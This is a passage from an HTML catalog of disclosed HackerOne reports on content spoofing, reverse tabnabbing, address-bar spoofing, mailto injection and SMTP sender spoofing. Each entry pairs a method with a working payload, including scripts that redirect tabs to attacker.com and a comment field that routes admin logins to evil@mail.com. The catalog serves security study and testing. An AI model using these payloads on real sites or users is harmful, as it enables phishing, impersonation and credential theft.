+<p class="insight"><b>Insight —</b> Any 'publish/post as' API that accepts an actor-id or object-id parameter is an identity/authorization test: substitute another user's id and a restricted object id and see if the server binds identity to the session instead of the parameter.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1566325" target="_blank" rel="noopener">hackerone.com/reports/1566325</a></span><a class="src" href="#report-1566325" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-149798" style="--sv:var(--sev-low)" data-sev="1" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Text/content injection into error page for phishing</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#149798</b> · nextcloud · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unvalidated URL path segment is reflected verbatim into the not-found/error message (WebDAV remote.php/dav/files/&lt;injected&gt;), letting an attacker embed a convincing message (e.g. 'files moved to fakedomain.com') on the trusted origin for social engineering.</p>
+<h4>Method</h4><ol><li>Find an endpoint that echoes part of the URL/path into an error or not-found page</li><li>Insert a crafted human-readable message (URL-encoded) in that segment</li><li>Send the trusted-origin link to the victim; the injected text appears as if from the app</li></ol>
+<div class="pre">http://TARGET/remote.php/dav/files/The%20files%20were%20moved%20to%20fakedomain.com%20please%20visit%20there</div>
+<p class="insight"><b>Insight —</b> Reflected text (even without HTML/JS) in error/404/search pages is a content-spoofing primitive: it lends the trusted domain to an attacker's phishing message. Test path segments and query params that surface in error text; escalate if HTML/markup is not stripped.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/149798" target="_blank" rel="noopener">hackerone.com/reports/149798</a></span><a class="src" href="#report-149798" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-3921" style="--sv:var(--sev-low)" data-sev="1" data-votes="8" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Trailing control char in username to spoof identity</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#3921</b> · phabricator · USD 300 · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>phabricator</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Username uniqueness/validation did not reject appended control characters (%0a). Registering an existing user's name with a trailing newline creates a distinct account that displays with the identical name, enabling impersonation.</p>
+<h4>Method</h4><ol><li>During registration, take a victim's exact username</li><li>In an intercepting proxy, append %0a (or other control char) to the username field before the request is sent</li><li>Account is created; it displays as the victim's name (profile lookup 404s but display collides)</li></ol>
+<div class="pre">POST /people/register
+...
+username=victimname%0a</div>
+<p class="insight"><b>Insight —</b> Test identity/username fields with trailing/embedded control and zero-width chars (%0a, %0d, %00, U+200B, trailing space). Uniqueness checks that compare raw bytes but render trimmed produce impersonation.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3921" target="_blank" rel="noopener">hackerone.com/reports/3921</a></span><a class="src" href="#report-3921" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-215044" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mobile address-bar spoofing via history.replaceState to blob: URL</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#215044</b> · brave · awarded · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>mobile-ios</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The mobile browser reflected the URL passed to history.replaceState() into the address bar without validating scheme/consistency, so a page could display a blob: (or arbitrary) URL that does not match the actual origin.</p>
+<h4>Method</h4><ol><li>Host a page on attacker origin</li><li>In JS call history.replaceState('','','blob:http://TARGET/xxxx')</li><li>The displayed address bar changes to the spoofed blob URL while content stays attacker-controlled</li></ol>
+<div class="pre">&lt;script&gt;
+history.replaceState('','','blob:http://192.168.1.111/xxxx')
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> On mobile browsers/WebViews, test history.pushState/replaceState with mismatched-origin, blob:, and long/whitespace-padded URLs to spoof the address bar. Any browser that trusts the scripted history URL for the omnibox is phishable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/215044" target="_blank" rel="noopener">hackerone.com/reports/215044</a></span><a class="src" href="#report-215044" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-280500" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via window.opener on target=_blank links</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#280500</b> · infogram · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>infogram</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-supplied links are rendered with target=_blank but without rel=noopener, so the destination page retains a window.opener reference and can navigate the original tab to a phishing page.</p>
+<h4>Method</h4><ol><li>Provide an attacker URL where the app renders it as a target=_blank link (e.g. project external URL)</li><li>Attacker page runs window.opener.location.replace(evilURL) when opened</li><li>Victim returns to the original tab to find it redirected to the attacker's page</li></ol>
+<div class="pre">&lt;html&gt;&lt;script&gt;
+if (window.opener) window.opener.location.replace('http://attacker.com');
+if (window.parent != window) window.parent.location.replace('http://attacker.com');
+&lt;/script&gt;&lt;/html&gt;
+
+&lt;!-- Fix: rel="nofollow noopener noreferrer" on the target=_blank anchor --&gt;</div>
+<p class="insight"><b>Insight —</b> Wherever an app renders user-controlled links with target=_blank, check for missing rel=noopener: the linked page can silently repoint the opener tab for phishing. Simple, high-coverage check on profile/bio/project URL fields.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/280500" target="_blank" rel="noopener">hackerone.com/reports/280500</a></span><a class="src" href="#report-280500" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-154827" style="--sv:var(--sev-low)" data-sev="1" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Breadcrumb message spoofing via encoded traversal and null-byte CSP redirect bypass</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#154827</b> · nextcloud · USD 50 · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'dir' parameter is reflected into the directory breadcrumb; traversal-prevention could be bypassed with URL-encoded periods, and a null byte in the URL triggered a CSP error that aborted the normalizing redirect, letting attacker text persist in the breadcrumb as a spoofed message.</p>
+<h4>Method</h4><ol><li>Set dir to an encoded-traversal path that resolves to a 301 so the injected text stays in the breadcrumb</li><li>Alternatively insert %00 so Chrome's CSP error blocks the ajax redirect to dir=/, leaving attacker text displayed</li><li>Victim sees an attacker-authored message (e.g. 'Error - please restart your computer') under the trusted UI</li></ol>
+<div class="pre">https://demo.nextcloud.com/index.php/apps/files/?dir=%2E%2E/%2E%2E/%2E%2E/.well-known/caldav/Error%20-%20please%20restart%20your%20computer%20to%20continue
+https://demo.nextcloud.com/index.php/apps/files/?dir=%00Error!%20Please%20restart%20your%20computer%20and%20try%20again</div>
+<p class="insight"><b>Insight —</b> When a value reflected into UI is 'sanitized' by a client-side redirect/normalization, look for ways to abort that redirect: URL-encoded traversal (%2E%2E) to dodge filters and a null byte (%00) to trigger a CSP/ajax failure that leaves your injected content on screen. Content spoofing survives when the cleanup step can be broken.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/154827" target="_blank" rel="noopener">hackerone.com/reports/154827</a></span><a class="src" href="#report-154827" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-175085" style="--sv:var(--sev-low)" data-sev="1" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>URI-scheme allowlist bypass -&gt; CSP/img filter evasion, opener control and info leak</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#175085</b> · nextcloud · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>scheme-filter bypass -&gt; CSP/img-proxy bypass -&gt; window</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An HTML-mail sanitizer rewrites only http/https/cid schemes through its proxy/redirect filter, leaving ftp: and scheme-less/relative URLs (../..) unfiltered, so attacker src/href bypass the image proxy and CSP; a blanket target=_blank on &lt;a&gt; then enables reverse-tabnabbing (window.opener control) and leaks the user's accountID via the link.</p>
+<h4>Method</h4><ol><li>Send an HTML email rendered by the app's sanitizer</li><li>Use disallowed-but-accepted schemes (ftp://) or relative paths for src/href to skip the http/https/cid rewrite</li><li>Confirm images load directly (image-proxy + CSP bypassed)</li><li>Because &lt;a&gt; gets target=_blank with no rel=noopener, the opened attacker page controls window.opener and can redirect the original tab / read leaked accountID from the URL</li></ol>
+<div class="pre">&lt;a href='ftp://user:pass@attacker.tld/hax.html'&gt;Bypass link&lt;/a&gt;
+&lt;img src='/index.php/s/SHARE_TOKEN/download'&gt;  &lt;!-- relative, skips proxy --&gt;</div>
+<p class="insight"><b>Insight —</b> Scheme allowlists in sanitizers are enforced case-by-case; enumerate the schemes NOT in the rewrite list (ftp, filesystem, blob, relative/scheme-less) to slip past proxy and CSP. Any framework that forces target=_blank without rel=noopener is a reverse-tabnabbing sink - the opened page can navigate window.opener.location to a phishing clone.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/175085" target="_blank" rel="noopener">hackerone.com/reports/175085</a></span><a class="src" href="#report-175085" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-403891" style="--sv:var(--sev-low)" data-sev="1" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via window.opener (missing rel=noopener)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#403891</b> · weblate · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span><span>Chain <b>reverse tabnabbing -&gt; credential phishing -&gt; account t</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled links rendered with target=_blank but without rel=noopener/noreferrer let the opened page reach back via window.opener and rewrite the original tab's location to a phishing clone.</p>
+<h4>Method</h4><ol><li>Find a place that renders a user-supplied URL as target=_blank without rel=noopener (here: translation source / editorial links)</li><li>Host a page that runs window.opener.location = 'https://attacker/fake-login'</li><li>Victim opens the link; while focused on the new tab, the background original tab is silently swapped to the phishing page</li></ol>
+<div class="pre">&lt;!-- attacker page loaded in the new tab --&gt;
+&lt;script&gt;if (window.opener) window.opener.location = 'https://attacker.tld/fake-login';&lt;/script&gt;
+&lt;!-- fix on the site: &lt;a target="_blank" rel="noopener noreferrer"&gt; --&gt;</div>
+<p class="insight"><b>Insight —</b> Wherever an app renders user-provided links (profile URLs, translation sources, comments) with target=_blank, check for missing rel=noopener — the opener reference is a low-effort phishing/ATO primitive. Sites that null window.opener (Google, Twitter) are the safe pattern to compare against.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/403891" target="_blank" rel="noopener">hackerone.com/reports/403891</a></span><a class="src" href="#report-403891" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-158002" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via missing rel=noopener/noreferrer</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#158002</b> · instacart · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>instacart</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-supplied outbound links (added to lists) open in a new tab (target=_blank / new window) without rel=noopener noreferrer. The destination page keeps a reference to window.opener and can rewrite the original tab's URL, redirecting the trusted origin's tab to a phishing page.</p>
+<h4>Method</h4><ol><li>Add a link you control to a user-generated content area that renders it as target=_blank.</li><li>On the destination page run window.opener.location = 'https://phish.example'.</li><li>Victim clicks the link; the original (trusted) tab is silently navigated to the attacker page.</li></ol>
+<div class="pre">&lt;!-- attacker-controlled destination page --&gt;
+&lt;script&gt;if (window.opener) window.opener.location = 'http://example.com';&lt;/script&gt;
+&lt;!-- vulnerable markup lacks: rel="noopener noreferrer" --&gt;</div>
+<p class="insight"><b>Insight —</b> Any feature that renders user-supplied URLs with target=_blank and no rel=noopener is a reverse-tabnabbing sink. Test by hosting a page that rewrites window.opener.location; the trust of the original tab powers the phish.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/158002" target="_blank" rel="noopener">hackerone.com/reports/158002</a></span><a class="src" href="#report-158002" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1819652" style="--sv:var(--sev-low)" data-sev="1" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cross-origin UI spoofing via origin-less scheme dialog (Brave iOS)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1819652</b> · brave · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>mobile-ios</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The confirmation dialog for sms:/tel: links does not show the caller origin and, unlike JS alert() dialogs, is rendered on the topmost screen even when a different tab is active. An attacker page can open a trusted site in a new tab, then pop its own scheme dialog over that trusted site.</p>
+<h4>Method</h4><ol><li>Attacker page opens a trusted site (e.g. google.com) in a new tab</li><li>Attacker triggers an sms:/tel: link</li><li>The origin-less confirmation dialog appears over the now-active trusted tab, appearing to originate from it</li></ol>
+<div class="pre">Visit https://csrf.jp/brave/sms.php -&gt; tap 'Click Me' -&gt; google.com opens -&gt; sms: confirmation dialog shown over google.com</div>
+<p class="insight"><b>Insight —</b> Any native/scheme confirmation dialog that omits the requesting origin and can render over a different active tab/window is a cross-origin UI-spoofing primitive. Test whether such dialogs are modal to their origin and attributed; compare against JS alert() which is bound to its tab.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1819652" target="_blank" rel="noopener">hackerone.com/reports/1819652</a></span><a class="src" href="#report-1819652" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-145463" style="--sv:var(--sev-low)" data-sev="1" data-votes="2" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected content spoofing via app parameter (unfiltered dir/message value in generated text)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#145463</b> · nextcloud · awarded · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A request parameter (dir, or an error message parameter) is reflected verbatim into an application-generated text/message. Prefixing with ../../ (or supplying arbitrary text) lets an attacker inject phishing content that appears to come from the trusted app. Assigned CVE-2016-9460.</p>
+<h4>Method</h4><ol><li>Find a parameter whose value is echoed into an app message or listing (e.g. dir=, message=)</li><li>Supply ../../ to defeat the redirect-to-home behavior, then append attacker text</li><li>The attacker text renders in the trusted origin as if it were an official notice</li></ol>
+<div class="pre">http://TARGET/nextcloud/index.php/apps/files/?dir=../../Welcome+to+Nextcloud+You+can+get+pro+account+by+navigating+this+example.com
+
+// app-message-parameter variant (owncloud galleryplus, #87752):
+http://TARGET/owncloud/index.php/apps/galleryplus/error?message=Welcome to owncloud. Send 10 usd to paypal example@example.com&amp;code=0</div>
+<p class="insight"><b>Insight —</b> Any parameter reflected into an app-rendered message (error text, breadcrumb, directory label, status banner) is a content-spoofing/phishing sink even when HTML is escaped - plain injected text in a trusted origin is enough to social-engineer. Test dir/path/message/error/status params for verbatim reflection.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/145463" target="_blank" rel="noopener">hackerone.com/reports/145463</a></span><a class="src" href="#report-145463" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-106348" style="--sv:var(--sev-low)" data-sev="1" data-votes="2" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Text injection in reflected 404/error page for phishing</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#106348</b> · algolia · awarded · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>algolia</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Default server 404 pages echo the requested path verbatim ("The requested URL &lt;path&gt; was not found on this server"). Encoding arbitrary text (and %2f../ or %0d%0a tricks) into the path injects attacker-controlled phishing text into a page served from the trusted origin.</p>
+<h4>Method</h4><ol><li>Request a non-existent path on the target that contains attacker phishing text (URL-encoded spaces/slashes)</li><li>The server's default 404/error page reflects the path text back into the page body</li><li>Victim sees attacker text ("this has moved to attacker.com, go there") on the legitimate domain</li></ol>
+<div class="pre">https://TARGET/test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://ATTACKER.com%20so%20go%20to%20the%20new%20one%20since%20this%20one
+
+// CRLF-flavored variant (#164137,#168078):
+https://TARGET/%0d%0ahas%20moved%20to%20www.ATTACKER.com.%20Please%20visit%20ATTACKER.com</div>
+<p class="insight"><b>Insight —</b> Probe error pages (404/403/500) for verbatim reflection of the request path or query. Even with HTML escaped, injected plaintext on the real domain is a viable phishing/redirect-lure primitive. Fix is a static error page that never echoes request input. Extremely common across many programs - low severity, easy to farm but usually merged as informative unless a bounty program values content spoofing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/106348" target="_blank" rel="noopener">hackerone.com/reports/106348</a></span><a class="src" href="#report-106348" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-72976" style="--sv:var(--sev-low)" data-sev="1" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mailto-parameter injection via user email field -&gt; attacker-controlled reply email</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#72976</b> · shopify · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A user-supplied email address (blog-comment email field) is rendered into a clickable mailto: link without validation/encoding, so an attacker packs mailto query parameters (?body=...&amp;to=...) plus non-breaking-space padding into the 'email' value; when the admin clicks reply their mail client honors the injected body/to, composing a phishing message.</p>
+<h4>Method</h4><ol><li>Post a blog comment supplying a crafted 'email' value that contains a mailto query string with the phishing text in ?body= and attacker address in &amp;to=, padded with U+00A0 (non-breaking spaces) so the visible address looks normal and pushes the malicious link off-screen</li><li>Admin views the comment and clicks the reply/mailto link</li><li>Admin's email client interprets the injected body= and to=, pre-filling an attacker-authored credential-phishing message to the attacker's address</li></ol>
+<div class="pre">POST /blogs/news/18286141-first-post/comments HTTP/1.1
+Host: test-4579.myshopify.com
+Content-Type: application/x-www-form-urlencoded
+
+comment[author]=testxss&amp;comment[email]=Reply\u00a0customer\u00a0...(nbsp padding)...?body=To\u00a0identify\u00a0you\u00a0as\u00a0shop\u00a0administrator\u00a0please\u00a0enter\u00a0your\u00a0login:\u00a0________\u00a0and\u00a0password:\u00a0________\u00a0and\u00a0send\u00a0a\u00a0letter&amp;to=evil@mail.com&amp;comment[body]=gyjghhj</div>
+<p class="insight"><b>Insight —</b> Any field that later becomes a mailto: link (contact forms, comment authors, support tickets) is a header/parameter-injection sink: try injecting ?subject=, ?body=, &amp;to=, &amp;cc= into the address. Combine with non-breaking-space padding to hide the payload on small screens. Turns a benign 'email' input into a targeted phishing primitive against staff.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/72976" target="_blank" rel="noopener">hackerone.com/reports/72976</a></span><a class="src" href="#report-72976" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-843421" style="--sv:var(--sev-low)" data-sev="1" data-votes="0" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Hyperlink injection via display/organization-name field in notification emails</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#843421</b> · undisclosed · none ·  votes · resolved</div>
+<div class="taxo"><span>Program <b>undisclosed</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An organization/display-name value is rendered as a clickable link in system-generated invitation emails without sanitization, so setting the name to https://attacker.com plants an attacker link inside a trusted, legitimately-sent email.</p>
+<h4>Method</h4><ol><li>Set a user/org/display-name field to an absolute URL (https://attacker.com).</li><li>Trigger a notification/invitation email that echoes that field.</li><li>The recipient sees an attacker link inside a genuine platform email.</li></ol>
+<div class="pre">Organization name: https://attacker.com  -&gt;  rendered as &lt;a href&gt; in the invite email</div>
+<p class="insight"><b>Insight —</b> Any user-controlled name/text echoed into outbound emails is a hyperlink/HTML-injection surface. Test name, org, profile, and comment fields with URLs (and markup) and observe the delivered email.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/843421" target="_blank" rel="noopener">hackerone.com/reports/843421</a></span><a class="src" href="#report-843421" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-549364" style="--sv:var(--sev-low)" data-sev="1" data-votes="117" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Official SMS references a registerable look-alike domain</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#549364</b> · security · awarded · 117 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The account-recovery SMS told users to contact 'supportahackerone.com' -- an unregistered look-alike (typo of support.hackerone.com) an attacker could buy and weaponize for phishing with the platform's own credibility.</p>
+<h4>Method</h4><ol><li>Set up account recovery to receive the SMS</li><li>Observe it names supportahackerone.com</li><li>Register that domain and phish users the platform directs there</li></ol>
+<p class="insight"><b>Insight —</b> Audit outbound comms (SMS/email/push) for references to domains the org does NOT own -- typo'd, unregistered, or third-party. Attacker registers it and inherits the sender's trust; a real, cheap phishing primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/549364" target="_blank" rel="noopener">hackerone.com/reports/549364</a></span><a class="src" href="#report-549364" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1082991" style="--sv:var(--sev-low)" data-sev="1" data-votes="36" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>In-app browser address-bar spoofing (LINE iOS)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1082991</b> · line · none · 36 votes · resolved</div>
+<div class="taxo"><span>Program <b>line</b></span><span>Surface <b>mobile-ios</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The in-app WebView updates the displayed address bar for a navigation that is actually cancelled (invalid hostname / redirect), and applies URL normalization at the wrong time. A malicious Unicode-laden hostname is displayed as a different, legitimate-looking host than the page actually loaded.</p>
+<h4>Method</h4><ol><li>Serve a redirect chain that navigates to an invalid/normalized hostname</li><li>WebView writes the spoofed hostname to the address bar even though navigation is cancelled</li><li>Displayed host differs from the real host serving the phishing content</li></ol>
+<p class="insight"><b>Insight —</b> In mobile in-app browsers, test whether the address bar updates before navigation commits, on cancelled navigations, or during redirects, and whether unicode normalization is applied inconsistently. These timing/normalization gaps yield address-bar spoofing (CVE-2021-36215).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1082991" target="_blank" rel="noopener">hackerone.com/reports/1082991</a></span><a class="src" href="#report-1082991" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-265696" style="--sv:var(--sev-low)" data-sev="1" data-votes="20" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Broken-link hijacking inside a trusted domain</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#265696</b> · gitlab · none · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A hyperlink on the trusted domain pointed to an external profile/handle that had since been deleted; re-registering that handle lets an attacker control a link that appears to originate from the trusted site.</p>
+<h4>Method</h4><ol><li>Crawl the target's pages/blog/security page for outbound links</li><li>Check each destination for deleted accounts / expired domains / unclaimed handles (404, NXDOMAIN)</li><li>Re-register the dangling handle/domain to control the link's destination</li></ol>
+<p class="insight"><b>Insight —</b> Broken-link hijacking turns a victim's own reputation into a phishing primitive; enumerate dead outbound links (blog author profiles, docs, program security pages) and check whether the destination handle/domain is claimable. Even one click can redirect reports/users to attacker infrastructure.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/265696" target="_blank" rel="noopener">hackerone.com/reports/265696</a></span><a class="src" href="#report-265696" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2264982" style="--sv:var(--sev-none)" data-sev="0" data-votes="70" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated SMTP (587) accepts local-domain delivery -&gt; spoofed internal mail</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2264982</b> · sidefx · USD 300 · 70 votes · resolved</div>
+<div class="taxo"><span>Program <b>sidefx</b></span><span>Surface <b>network</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An internet-exposed SMTP service accepts unauthenticated connections and, while denying open relay, still queues mail addressed to its own domain with an arbitrary MAIL FROM -&gt; spoofed internal email.</p>
+<h4>Method</h4><ol><li>nmap -p 587 TARGET_IP to find open SMTP</li><li>telnet TARGET_IP 587 and issue HELO/EHLO</li><li>MAIL FROM: any@target-domain ; RCPT TO: someone@target-domain (relay to outsiders denied, local delivery not)</li><li>DATA + body + '.' -&gt; server queues the spoofed message</li></ol>
+<div class="pre">telnet TARGET_IP 587
+HELO x
+MAIL FROM: support@target.com
+RCPT TO: media@target.com
+DATA
+subject: test
+body
+.</div>
+<p class="insight"><b>Insight —</b> Even when open relay is blocked, test whether an exposed MTA accepts unauthenticated mail to its OWN domain; that alone enables convincing internal phishing from a legitimate-looking sender.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2264982" target="_blank" rel="noopener">hackerone.com/reports/2264982</a></span><a class="src" href="#report-2264982" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-175958" style="--sv:var(--sev-none)" data-sev="0" data-votes="30" data-bounty="200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mobile browser address-bar spoofing via navigation race</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#175958</b> · brave · USD 200 · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>mobile-ios</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The browser updates the address bar to a target URL when navigation to it is initiated, but if the navigation is repeatedly interrupted (setInterval flipping location to a trusted URL) the bar keeps showing the trusted URL (with lock icon) while attacker content stays rendered (CVE-2016-9473).</p>
+<h4>Method</h4><ol><li>Host attacker page with a login-lookalike form</li><li>Use setInterval to repeatedly set location to a trusted URL every ~10ms</li><li>Browser shows the trusted URL + TLS lock but fails to swap content</li><li>Victim trusts the spoofed bar and submits credentials</li></ol>
+<div class="pre">function f(){ location='https://facebook.com'; }
+setInterval(f, 10);  // address bar shows facebook.com w/ lock, body stays attacker-controlled</div>
+<p class="insight"><b>Insight —</b> Address bar is the only trust anchor on mobile. Test spoofing via rapid interrupted navigations (setInterval/window.open/204 responses). A green lock does not validate the displayed content.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/175958" target="_blank" rel="noopener">hackerone.com/reports/175958</a></span><a class="src" href="#report-175958" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2001913" style="--sv:var(--sev-none)" data-sev="0" data-votes="29" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Support-ticket injection on behalf of any user (email From spoofing + unauthenticated portal)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2001913</b> · security · awarded · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>other</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The helpdesk (Freshdesk) creates and keys a support ticket to whatever address is in the email From header (or to any email typed into an unauthenticated 'new ticket' form), with no ownership verification, so an attacker can open tickets as any victim or as staff.</p>
+<h4>Method</h4><ol><li>Identify the helpdesk intake channel: support@ email address and/or a public /support/tickets/new form.</li><li>Send a spoofed email with the victim's address in the From field to support@, or submit the new-ticket form with the victim's email + username.</li><li>A ticket is created on the victim's support account; agents may then act on it (e.g. account deletion), enabling social-engineering/impersonation.</li></ol>
+<div class="pre"># Fake mailer (e.g. emkei.cz):
+From: victim@example.com
+To: support@hackerone.com
+Subject: &lt;anything&gt;
+Body: &lt;anything&gt;
